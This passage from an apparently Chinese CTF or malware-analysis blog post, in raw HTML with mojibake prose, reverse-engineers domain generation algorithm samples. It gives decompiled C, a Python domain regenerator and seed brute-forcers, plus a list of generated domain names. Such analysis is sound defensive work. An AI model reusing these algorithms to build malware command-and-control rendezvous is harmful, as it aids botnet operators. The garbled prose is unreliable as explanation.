class="built_in">memset</span>(v23, <span class="number">0</span>, <span class="number">0x40</span>u);</span><br><span class="line">  *(_DWORD *)v21 = <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v22, <span class="number">0</span>, <span class="number">0x1A</span>u);</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v7 = a1[v6];</span><br><span class="line">    v17 += v7;</span><br><span class="line">    v23[v6++] = v7;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v6 != <span class="number">16</span> );</span><br><span class="line">  v19 = <span class="number">0</span>;</span><br><span class="line">  v15 = LOBYTE(v24[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = v19;</span><br><span class="line">    <span class="keyword">if</span> ( v19 &gt;= a5 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;v24[<span class="number">1</span>], <span class="number">0</span>, <span class="number">0x40</span>u);</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v24[v9 + <span class="number">1</span>] = v5[v9];</span><br><span class="line">      ++v9;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v9 != <span class="number">16</span> );</span><br><span class="line">    v10 = v15;</span><br><span class="line">    v11 = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memset</span>(v21, <span class="number">0</span>, <span class="number">0x1E</span>u);</span><br><span class="line">    v18 = v17;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v16 = (v18 ^ (v24[v11] + v10)) + v24[v11 + <span class="number">1</span>];</span><br><span class="line">        v10 = (<span class="keyword">unsigned</span> __int8)v16;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="keyword">unsigned</span> __int8)v16 - <span class="number">98</span> &lt;= <span class="number">0x17</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        ++v18;</span><br><span class="line">      &#125;</span><br><span class="line">      ++v11;</span><br><span class="line">      *(&amp;v20 + <span class="built_in">strlen</span>(v21) + <span class="number">1</span>) = v16;</span><br><span class="line">      v21[<span class="built_in">strlen</span>(v21) + <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v11 != <span class="number">13</span> );</span><br><span class="line">    v12 = a3;</span><br><span class="line">    *(&amp;v20 + <span class="built_in">strlen</span>(v21) + <span class="number">1</span>) = <span class="number">46</span>;</span><br><span class="line">    v13 = <span class="number">0</span>;</span><br><span class="line">    v21[<span class="built_in">strlen</span>(v21) + <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( v13 &lt; a4 )</span><br><span class="line">    &#123;</span><br><span class="line">      v14 = v12;</span><br><span class="line">      ++v13;</span><br><span class="line">      ++v12;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%s%s\n&quot;</span>, v21, v14);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcat</span>(v21, &amp;(*a3)[<span class="number">5</span> * a4 - <span class="number">5</span>]);</span><br><span class="line">    ++v19;</span><br><span class="line">    v5 = v21;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å¥½çœ‹å¤šäº†ï¼Œä¹‹å‰çš„v24å’Œv25æŒ‡å‘çš„æ•°æ®æ˜¯åŒä¸€æ•°æ®ã€‚</p><p>å¾€ä¸‹çœ‹ï¼Œå‘ç°<code>v5 = v21;</code>ï¼Œv21ä¼šä½œä¸ºä¸‹ä¸€ä¸ªåŸŸåç”Ÿæˆç®—æ³•çš„è¾“å…¥ï¼Œè¦†ç›–â€umyyobuorstfabj.comâ€ã€‚</p><p>ç°åœ¨ä¹Ÿä¸çŸ¥é“é€‰äº†å“ªä¸ªåç¼€çš„åŸŸåä½œä¸ºçš„v21ï¼ŒåŠ¨æ€è°ƒä¸€ä¸‹ï¼Œå‘ç°æ˜¯clubã€‚</p><p>æˆ‘ä»¬æ²¡æœ‰a1å’Œa2ï¼Œä½†æ˜¯åªæœ‰ç¬¬ä¸€ä¸ªåŸŸåç”Ÿæˆç”¨åˆ°äº†a2ï¼Œåé¢çš„åŸŸåç”ŸæˆåŸºäºä¸Šä¸€ä¸ªåŸŸåï¼Œæˆ‘ä»¬é€‰ä¸€ç»„æŒ¨ç€çš„åŸŸåï¼Œa2çš„é—®é¢˜è§£å†³äº†ã€‚a1ä¹Ÿåªæ˜¯ç”¨äº†ä¸ªasciiç çš„å’Œï¼Œ256ç§å¯èƒ½ã€‚</p><p>è¿™é‡Œé¢è¿˜æœ‰ä¸ªv10ä¸çŸ¥é“ï¼Œ256ç§å¯èƒ½ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥çˆ†ç ´256*256ç§å¯èƒ½ï¼Œè¿˜åŸå‡ºè¿™ä¸¤ä¸ªå€¼ã€‚</p><p>å¾—åˆ°äº†ä¸¤ç»„å€¼ï¼š84, 119ä¸85, 48ã€‚</p><p>ç„¶åç›´æ¥ç…§ç€ç®—æ³•é€»è¾‘è·‘å¯ä»¥å¾—åˆ°åé¢çš„æ‰€æœ‰åŸŸåï¼Œä¸txtä¸­ç»“æœæ¯”å¯¹ï¼Œå‘ç°84ï¼Œ119çš„æ˜¯æ­£ç¡®çš„ã€‚</p><p>è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">s1 = <span class="string">&quot;xuvsxyrbjiyv&quot;</span></span><br><span class="line">s2 = <span class="string">&quot;rgujkdffrpde&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span>(<span class="params">v18, v10, s1</span>):</span></span><br><span class="line">    v11 = <span class="number">0</span></span><br><span class="line">    res = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            v16 = (v18 ^ (<span class="built_in">ord</span>(s1[v11]) + v10)) + <span class="built_in">ord</span>(s1[v11 + <span class="number">1</span>])</span><br><span class="line">            v10 = v16 &amp; <span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> (v10 - <span class="number">98</span>) &amp; <span class="number">0xffffff</span> &lt;= <span class="number">0x17</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            v18 += <span class="number">1</span></span><br><span class="line">        res += <span class="built_in">chr</span>(v10)</span><br><span class="line">        v11 += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> v11 == <span class="number">12</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># for v18 in range(255):</span></span><br><span class="line"><span class="comment">#     for v10 in range(255):</span></span><br><span class="line"><span class="comment">#         if calc(v18,v10,s1) == s2:</span></span><br><span class="line"><span class="comment">#             print v18,v10</span></span><br><span class="line"><span class="comment">#             break</span></span><br><span class="line">v18, v10 = <span class="number">84</span>, <span class="number">119</span></span><br><span class="line"><span class="comment"># v18, v10 = 85, 48</span></span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">for</span> ext <span class="keyword">in</span> [<span class="string">&#x27;pw&#x27;</span>, <span class="string">&#x27;us&#x27;</span>, <span class="string">&#x27;club&#x27;</span>]:</span><br><span class="line">        res.append(<span class="string">&quot;%s.%s&quot;</span> % (s1, ext))</span><br><span class="line">    s1 = calc(v18, v10, s1 + <span class="string">&quot;.club&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;domains2.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&quot;\n&quot;</span>.join(res))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>(unsigned int)(unsigned __int8)v16 - 98 &lt;= 0x17</code> è¿™ä¸ªåˆ¤æ–­ï¼Œæ³¨æ„æ— ç¬¦å·æ•°ï¼Œå¼€å§‹pythonæ²¡æ³¨æ„åˆ°è¿™ä¸ªé—®é¢˜ï¼ŒåŠ¨æ€è°ƒè¯•äº†ä¸€ä¼šæ‰å‘ç°è¿™é‡Œçš„é—®é¢˜ã€‚</p><h3 id="sample3"><a href="#sample3" class="headerlink" title="sample3"></a>sample3</h3><p>æ‹–è¿›IDAåˆ†æï¼Œä»£ç å¾ˆç®€å•ï¼ŒæŒ‡å®šéšæœºæ•°ç§å­å–ä½™æ¥ç”Ÿæˆå­—ç¬¦ä¸²ã€‚32bitçš„ç§å­ï¼Œä½†æ˜¯ç»™çš„100ä¸ªåŸŸåæ˜¯éšæœºé‡‡æ ·çš„100ä¸ªåŸŸåï¼Œæ‰“ä¹±äº†é¡ºåºï¼Œæ²¡æ³•ç›´æ¥çˆ†ç ´ã€‚</p><p>åº”è¯¥æ˜¯è¦çœ‹randçš„æºç ï¼Œå‚è€ƒ<a href="https://crypto.stackexchange.com/questions/6760/how-does-the-rand-function-in-c-work">https://crypto.stackexchange.com/questions/6760/how-does-the-rand-function-in-c-work</a></p><p>å…³é”®æºç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">long</span> holdrand = <span class="number">1L</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rand</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (((holdrand = holdrand * <span class="number">214013L</span> + <span class="number">2531011L</span>) &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0x7fff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">srand</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> seed)</span> </span>&#123;</span><br><span class="line">   holdrand = (<span class="keyword">long</span>) seed;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å…¶å®ç”Ÿæˆéšæœºæ•°ç®—æ³•å¾ˆç®€å•ï¼Œå°±ä¸€è¡Œã€‚è€Œä¸”æ¯æ¬¡ç”Ÿæˆçš„éšæœºæ•°ä»…å–å†³äºholdrandï¼Œç”Ÿæˆä¸€ä¸ªéšæœºæ•°çš„åŒæ—¶æŒ‡å®šä¸‹ä¸€æ¬¡ç”Ÿæˆéšæœºæ•°çš„holdrandï¼Œå°±æ˜¯ä¸€ä¸ªé€’æ¨å…¬å¼ã€‚</p><p>è¿™ä¸ªé¢˜ç›®ç›¸å½“äºç»™äº†æˆ‘ä»¬100ä¸ªè¿ç»­çš„éšæœºæ•°ç‰‡æ®µï¼ˆæ¨¡35çš„ç»“æœï¼‰ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸çŸ¥é“æ¯ä¸ªç‰‡æ®µçš„indexã€‚</p><p>åŒæ—¶ç¨‹åºåœ¨è¾“å‡ºdgaåŸŸåæ—¶ï¼Œè¾“å‡ºç¬¬ä¸€ä¸ªdgaåŸŸååªéœ€è¦ç”Ÿæˆä¸€ä¸ªdgaï¼›è¾“å‡ºç¬¬äºŒä¸ªdgaåŸŸåæ—¶è¦ç”Ÿæˆä¸¤ä¸ªdgaï¼ŒæŠŠæœ€åä¸€ä¸ªè¾“å‡ºï¼›è¾“å‡ºç¬¬ä¸‰ä¸ªdgaåŸŸåæ—¶è¦ç”Ÿæˆä¸‰ä¸ªdgaï¼ŒæŠŠæœ€åçš„è¾“å‡ºï¼Œä¹Ÿå°±æ˜¯è¯´ç¨‹åºå…±ç”Ÿæˆäº†1+2+3+â€¦+1000ï¼Œå³500500 ä¸ªåŸŸåã€‚</p><p>å…¶å®å®šä¹‰ç§å­å°±æ˜¯å®šä¹‰ä¸€ä¸ªholdrandï¼Œæˆ‘ä»¬ä»»æ„é€‰ä¸€ä¸ªè¾“å‡ºåŸŸåï¼Œç›´æ¥çˆ†ç ´ç§å­ï¼Œå¯ä»¥å¾—åˆ°ç”Ÿæˆè¿™ä¸ªåŸŸåå‰çš„holdrandã€‚</p><p>å°±æ‹¿ç¬¬ä¸€ä¸ªåŸŸåä¸ºä¾‹ï¼Œç›´æ¥çˆ†ç ´ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> res[<span class="number">24</span>];</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">char</span> v11[<span class="number">35</span>]=<span class="string">&quot;abcdefghijklmnopqrstuvwxyz123456789&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> correct[<span class="number">19</span>]=<span class="string">&quot;13mrjyvjjp4azbbkt7&quot;</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> seed;</span><br><span class="line"><span class="keyword">for</span>(seed=<span class="number">0</span>;seed&lt;(<span class="number">1</span>&lt;&lt;<span class="number">32</span><span class="number">-1</span>);seed++)&#123;</span><br><span class="line">srand(seed);</span><br><span class="line"><span class="keyword">int</span> flag=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">18</span>;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(!(v11[rand()%<span class="number">34</span>]==correct[i]))&#123;</span><br><span class="line">flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(flag)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%u\n&quot;</span>,seed);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°682174533ï¼Œä¹Ÿå°±æ˜¯è¯´ç”Ÿæˆ13mrjyvjjp4azbbkt7ä¹‹å‰ï¼Œholdrandçš„å€¼æ˜¯682174533ã€‚</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦ç¡®å®šï¼Œè¿™ä¸ªåŸŸåæ˜¯ç¬¬å‡ ä¸ªè¾“å‡ºçš„ã€‚æˆ‘ä»¬å¯ä»¥ä»¥682174533ä¸ºç§å­ä¸€ç›´ç”ŸæˆåŸŸåï¼ŒæŠŠæ¯ä¸ªåŸŸåä¸é¢˜ç›®ä¸­çš„100ä¸ªåŸŸåå¯¹æ¯”ï¼Œç›¸ç­‰å°±è®°å½•ä¸‹æ¥æ˜¯ç¬¬å‡ ä¸ªç”Ÿæˆçš„ï¼Œä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> *ext[]= &#123;<span class="string">&quot;.ru&quot;</span>,<span class="string">&quot;.com&quot;</span>,<span class="string">&quot;.net&quot;</span>,<span class="string">&quot;.biz&quot;</span>,<span class="string">&quot;.cn&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> v11[<span class="number">35</span>]=<span class="string">&quot;abcdefghijklmnopqrstuvwxyz123456789&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> correct[<span class="number">101</span>][<span class="number">24</span>] = &#123;<span class="string">&quot;13mrjyvjjp4azbbkt7.com&quot;</span>,<span class="string">&quot;1i8vw27dwm8ndevior.biz&quot;</span>,<span class="string">&quot;1j24mwoqqyfcx1qqss.ru&quot;</span>,<span class="string">&quot;1salpm53tfy88aqd5n.com&quot;</span>,<span class="string">&quot;2iffaefkjqo8bjtcu8.net&quot;</span>,<span class="string">&quot;2my1q1eee7i6ogxrgq.ru&quot;</span>,<span class="string">&quot;34wg8meomx1na5m2wc.net&quot;</span>,<span class="string">&quot;38yijueupbbm5k5czj.ru&quot;</span>,<span class="string">&quot;3wcly5scymjapoj7qa.com&quot;</span>,<span class="string">&quot;4bgi4o12snvq6ox3dx.cn&quot;</span>,<span class="string">&quot;4girwa5l6z8zl5ehbh.net&quot;</span>,<span class="string">&quot;52nh81fuoma1qppv8f.ru&quot;</span>,<span class="string">&quot;54u6nwwry22lay7x1r.cn&quot;</span>,<span class="string">&quot;5d8bf1p66ysy5bqfwj.cn&quot;</span>,<span class="string">&quot;5ewy3vxhb3vl5ydjhl.biz&quot;</span>,<span class="string">&quot;63sww2skr1kynlp56s.net&quot;</span>,<span class="string">&quot;6danvuyai8sykkg15r.biz&quot;</span>,<span class="string">&quot;6fqlt8ygeov2xb73vn.cn&quot;</span>,<span class="string">&quot;78zk88cs6viwj31qhh.com&quot;</span>,<span class="string">&quot;7lglt6bjbnxmnjvea8.biz&quot;</span>,<span class="string">&quot;7sryvpk8j76mmyfzqv.biz&quot;</span>,<span class="string">&quot;7xlwbrwad4khucxjo1.cn&quot;</span>,<span class="string">&quot;86ajx1ehnoxtoas81w.com&quot;</span>,<span class="string">&quot;8hmadc4ktcbp434i7v.com&quot;</span>,<span class="string">&quot;a6mj5awo1llzf6vptc.com&quot;</span>,<span class="string">&quot;aey5xbjb1yytrpo1qc.cn&quot;</span>,<span class="string">&quot;b7rv1i7lguqh4571ic.cn&quot;</span>,<span class="string">&quot;bmqqhw57ih541j2ker.biz&quot;</span>,<span class="string">&quot;cnfy6toctwqfckkcm2.ru&quot;</span>,<span class="string">&quot;cqjenuvx2vg7eit63h.cn&quot;</span>,<span class="string">&quot;cvbs1koh7mst2ds3ld.com&quot;</span>,<span class="string">&quot;cwcnn4b4wge5xilv7n.com&quot;</span>,<span class="string">&quot;diynmgrfvjlblouob1.biz&quot;</span>,<span class="string">&quot;djzmdjg3omx8p4ns3e.biz&quot;</span>,<span class="string">&quot;dk8ttigditrpxafg8i.biz&quot;</span>,<span class="string">&quot;dxhun2re2x1jywmwqo.biz&quot;</span>,<span class="string">&quot;eizwxdiapuco67vpa5.ru&quot;</span>,<span class="string">&quot;ep1gcq3mont3wtaygc.cn&quot;</span>,<span class="string">&quot;eqvp786z5t2iingl3x.com&quot;</span>,<span class="string">&quot;fltekcvgk42fitmjws.net&quot;</span>,<span class="string">&quot;fqqghkn46vjkzpru8b.cn&quot;</span>,<span class="string">&quot;gblgpuvnvdh2t7lz6f.biz&quot;</span>,<span class="string">&quot;giwn2ajock6qoo8jqh.com&quot;</span>,<span class="string">&quot;gsrt5g6dc44y1krilm.com&quot;</span>,<span class="string">&quot;gwwflrqe8tzdnkzbad.net&quot;</span>,<span class="string">&quot;gxmmxc1yxlcky4b48i.ru&quot;</span>,<span class="string">&quot;h5oj6uvuhhc1fayebb.net&quot;</span>,<span class="string">&quot;hcp2gvoxls1nfcr8ve.cn&quot;</span>,<span class="string">&quot;hee15fplmi7lewt1mh.net&quot;</span>,<span class="string">&quot;hejxlnvf1f8qeuzvrl.com&quot;</span>,<span class="string">&quot;hoovp7rac48dhvpmpz.net&quot;</span>,<span class="string">&quot;i8qq4ws38cyucerw4a.net&quot;</span>,<span class="string">&quot;ip6uqhdcpffrcihueb.biz&quot;</span>,<span class="string">&quot;it2qi12jtir5ezbngj.net&quot;</span>,<span class="string">&quot;jg84zupddsz2474o31.cn&quot;</span>,<span class="string">&quot;jhhha1dkrcxbpq1gef.net&quot;</span>,<span class="string">&quot;jp562btwn6b6lqh2v4.net&quot;</span>,<span class="string">&quot;jr6nwh7kpi5yvamuth.ru&quot;</span>,<span class="string">&quot;juq233tm5x226256yt.biz&quot;</span>,<span class="string">&quot;kcfyhc1qpuehugdhfh.cn&quot;</span>,<span class="string">&quot;krawjmve7je3leppj6.com&quot;</span>,<span class="string">&quot;ksz45gy7lg64m1yegu.biz&quot;</span>,<span class="string">&quot;kym26cus7oy47ejdns.biz&quot;</span>,<span class="string">&quot;l8pvucuo31tafkray5.net&quot;</span>,<span class="string">&quot;maree2g5ofzkpawm3p.com&quot;</span>,<span class="string">&quot;mcbp8rmlocn8lx82tk.ru&quot;</span>,<span class="string">&quot;n57guekus5jogctr3e.biz&quot;</span>,<span class="string">&quot;n8zlxmjoj4ygms8de7.biz&quot;</span>,<span class="string">&quot;nbrbhh2tcj2lg6bmz2.net&quot;</span>,<span class="string">&quot;nlbyrkzjx2mxrs36ox.ru&quot;</span>,<span class="string">&quot;npeqblt5rstjedji14.com&quot;</span>,<span class="string">&quot;nyc5q1wpfk8wz2wwcr.net&quot;</span>,<span class="string">&quot;opfqo1et1t2uafmian.com&quot;</span>,<span class="string">&quot;ox6ytaor1zaw3q4ayh.cn&quot;</span>,<span class="string">&quot;p3otg2s5rroc6q66lo.biz&quot;</span>,<span class="string">&quot;pi5kv5smcp2c6apyws.cn&quot;</span>,<span class="string">&quot;piw3lg3rg6l7hkil5c.cn&quot;</span>,<span class="string">&quot;pw2rtqouw8jv3ygrjz.cn&quot;</span>,<span class="string">&quot;qasmd3q8fextt8d8pe.com&quot;</span>,<span class="string">&quot;qn3spnkqzq7zbk78u2.biz&quot;</span>,<span class="string">&quot;qs4rbmn88sszioir2p.cn&quot;</span>,<span class="string">&quot;qxv77gv8yiju5u6lr5.biz&quot;</span>,<span class="string">&quot;rn4lgriv68zkediyl8.biz&quot;</span>,<span class="string">&quot;seym7xlklokoetaznu.biz&quot;</span>,<span class="string">&quot;sfidso8x1el2zafisb.com&quot;</span>,<span class="string">&quot;suoj6qdfb6phfu27d5.com&quot;</span>,<span class="string">&quot;tf552bfsqgm2mvftz7.cn&quot;</span>,<span class="string">&quot;tf6ccv76jkdza7qbxj.com&quot;</span>,<span class="string">&quot;tojrtinlfkhwy777q4.biz&quot;</span>,<span class="string">&quot;tr44klrfrnaj5pwr8u.com&quot;</span>,<span class="string">&quot;tu7yg7dr41juxibyv1.ru&quot;</span>,<span class="string">&quot;tyn1pdkagg4pq8zjwy.cn&quot;</span>,<span class="string">&quot;uatztm3o4cn58p8ez6.ru&quot;</span>,<span class="string">&quot;uga11fbdkk6p3eehst.biz&quot;</span>,<span class="string">&quot;vcdtmzs5ug6njdjosa.ru&quot;</span>,<span class="string">&quot;vpn8qcwrsnzb88juv2.net&quot;</span>,<span class="string">&quot;vsd4t2zh81fux8hje5.com&quot;</span>,<span class="string">&quot;vu86xk61km7tir5yx4.biz&quot;</span>,<span class="string">&quot;ykmg2j4deklnyg3dsq.net&quot;</span>,<span class="string">&quot;zv88bhuwftedaspl56.ru&quot;</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">brute_force</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> seed)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> amount=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> res[<span class="number">24</span>];</span><br><span class="line"><span class="keyword">int</span> v1 = <span class="number">1</span>;</span><br><span class="line">srand(seed);</span><br><span class="line"><span class="keyword">int</span> v2,v3,v5,len,v7;</span><br><span class="line"><span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v2=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">res[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">v7 = <span class="number">18</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">len=<span class="built_in">strlen</span>(res);</span><br><span class="line">res[len]=v11[rand()%<span class="number">34</span>];</span><br><span class="line">res[len+<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">v3 = v7-- == <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(!v3);</span><br><span class="line">v5 = rand();</span><br><span class="line"><span class="built_in">strcat</span>(res,ext[v5%<span class="number">5</span>]);</span><br><span class="line">amount++;</span><br><span class="line"><span class="keyword">int</span> tmp;</span><br><span class="line"><span class="keyword">for</span>(tmp=<span class="number">0</span>;tmp&lt;<span class="number">100</span>;tmp++)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(res,correct[tmp])==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>,amount);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">++v2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(v1!=v2);</span><br><span class="line">++v1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(v1!=<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> res[<span class="number">24</span>];</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> seed=<span class="number">682174533</span>;</span><br><span class="line">brute_force(seed);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 